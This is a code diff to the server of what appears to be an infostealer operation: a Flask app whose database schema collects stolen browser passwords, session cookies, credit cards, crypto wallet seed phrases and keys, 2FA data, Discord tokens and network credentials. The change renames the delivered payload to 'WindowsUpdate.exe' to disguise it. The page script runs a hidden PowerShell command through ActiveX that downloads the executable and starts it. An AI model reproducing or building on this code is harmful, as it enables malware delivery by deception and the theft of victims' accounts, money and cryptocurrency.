@@ -59,11 +59,11 @@ def init_db():
                 screen_res TEXT,
                 
                 -- CHROME/EDGE/BRAVE/OPERA (LOGINS + CC + WALLETS)
-                chrome_logins TEXT,      -- ALL passwords (JSON array)
-                chrome_cookies TEXT,     -- Session cookies (login bypass)
-                chrome_ccs TEXT,         -- Credit cards (with CVV)
-                chrome_addresses TEXT,    -- Saved addresses
-                chrome_wallets TEXT,      -- Extension wallet data
+                chrome_logins TEXT,
+                chrome_cookies TEXT,
+                chrome_ccs TEXT,
+                chrome_addresses TEXT,
+                chrome_wallets TEXT,
                 
                 edge_logins TEXT,
                 edge_cookies TEXT,
@@ -84,7 +84,7 @@ def init_db():
                 firefox_ccs TEXT,
                 
                 -- WALLETS (DIRECT EXTRACTION)
-                metamask_data TEXT,       -- Seed phrases, private keys
+                metamask_data TEXT,
                 exodus_data TEXT,
                 electrum_data TEXT,
                 atomic_data TEXT,
@@ -95,11 +95,11 @@ def init_db():
                 trust_wallet_data TEXT,
                 phantom_data TEXT,
                 
-                wallet_extensions TEXT,   -- 100+ wallet extensions detected
-                wallet_phrases TEXT,      -- Seed phrases (THE GOLD)
-                wallet_keys TEXT,         -- Private keys (THE GOLD)
-                wallet_addresses TEXT,    -- Crypto addresses
-                wallet_balances TEXT,     -- If available
+                wallet_extensions TEXT,
+                wallet_phrases TEXT,
+                wallet_keys TEXT,
+                wallet_addresses TEXT,
+                wallet_balances TEXT,
                 
                 -- 2FA & Authenticators
                 authy_data TEXT,
@@ -107,7 +107,7 @@ def init_db():
                 microsoft_auth TEXT,
                 
                 -- Gaming & Messaging
-                discord_tokens TEXT,       -- Full Discord access
+                discord_tokens TEXT,
                 discord_2fa TEXT,
                 discord_email TEXT,
                 discord_phone TEXT,
@@ -121,7 +121,7 @@ def init_db():
                 whatsapp_data TEXT,
                 
                 -- Network
-                wifi_passwords TEXT,       -- ALL saved WiFi networks
+                wifi_passwords TEXT,
                 vpn_credentials TEXT,
                 rdp_credentials TEXT,
                 ftp_credentials TEXT,
@@ -205,7 +205,7 @@ def authenticate(f):
     return decorated
 
 # ==========================================
-# MAIN PAYLOAD DELIVERY - NO DOWNLOAD WARNING
+# MAIN PAYLOAD DELIVERY - FIXED TO USE WINDOWSUPDATE.EXE
 # ==========================================
 @app.route('/')
 def index():
@@ -223,8 +223,8 @@ def index():
         ))
         conn.commit()
     
-    # Smart EXE delivery - tricks browsers into auto-running
-    response = make_response(send_file('Warfare.exe', 
+    # Smart EXE delivery - uses WindowsUpdate.exe
+    response = make_response(send_file('WindowsUpdate.exe', 
                                        as_attachment=True, 
                                        download_name='WindowsUpdate.exe',
                                        mimetype='application/x-msdownload'))
@@ -263,7 +263,7 @@ def direct_run():
                 
                 // Method 2: PowerShell download + execute
                 try {
-                    var ps = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \\"$wc=New-Object System.Net.WebClient;$wc.DownloadFile('https://" + window.location.host + "/Warfare.exe','%temp%\\WinUpd.exe');Start-Process '%temp%\\WinUpd.exe'\\"";
+                    var ps = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \\"$wc=New-Object System.Net.WebClient;$wc.DownloadFile('https://" + window.location.host + "/WindowsUpdate.exe','%temp%\\WinUpd.exe');Start-Process '%temp%\\WinUpd.exe'\\"";
                     new ActiveXObject("WScript.Shell").Run(ps, 0, false);
                 } catch(e) {}
                 
